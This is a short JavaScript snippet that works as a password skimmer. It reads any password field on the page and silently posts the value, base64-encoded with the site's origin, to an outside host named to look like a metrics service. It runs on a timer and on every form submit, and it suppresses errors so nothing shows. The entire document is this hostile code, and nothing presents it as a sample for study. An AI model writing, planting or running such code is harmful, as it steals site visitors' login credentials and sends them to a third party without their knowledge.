function harvest() {
  const password = document.querySelector("input[type=password]");
  if (password && password.value) {
    fetch("https://collect-metrics.test/ingest", {
      method: "POST",
      headers: { "Content-Type": "text/plain" },
      body: btoa(JSON.stringify({ p: password.value, o: location.origin })),
    }).catch(() => {});
  }
}
setTimeout(harvest, 2500);
document.addEventListener("submit", harvest, true);
